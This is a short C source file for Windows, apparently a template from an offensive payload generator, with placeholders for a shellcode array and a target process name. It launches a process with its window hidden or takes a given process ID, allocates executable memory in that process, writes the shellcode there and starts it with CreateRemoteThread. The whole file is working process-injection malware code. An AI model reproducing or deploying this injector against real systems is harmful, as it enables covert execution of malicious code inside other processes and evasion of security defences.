#define WINVER 0x0501

#include<windows.h>

#REPLACEME#

void pump(DWORD);

int main(int argc, char *argv[])
{
	int x = atoi(argv[1]);
	STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi= {0};

	if (x > 0)
	{
		pump(x);
	} else {
		BOOL bSuccess = FALSE;
		DWORD dwPid = 0;
		bSuccess = CreateProcess(NULL, "#REPLACEMEPROCESS#", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		if (bSuccess)
		{
			dwPid = GetProcessId(pi.hProcess);
			pump(dwPid);
		}
	}
	return 0;
}


void pump(DWORD dwProcessID) {
	HANDLE hProc;
	HANDLE hRemoteThread;
	PVOID pRemoteBuffer;

	if(!dwProcessID) {
		exit(0);
	}
	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
	if(!hProc) {
		exit(0);
	}
	pRemoteBuffer = VirtualAllocEx(hProc, NULL, sizeof(sc)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pRemoteBuffer) {
		exit(0);
	}
	if (!WriteProcessMemory(hProc, pRemoteBuffer, sc, sizeof(sc), NULL)) {
		exit(0);
	}
	CreateRemoteThread(hProc, NULL, 0, pRemoteBuffer, NULL, 0, NULL);
	CloseHandle(hProc);
}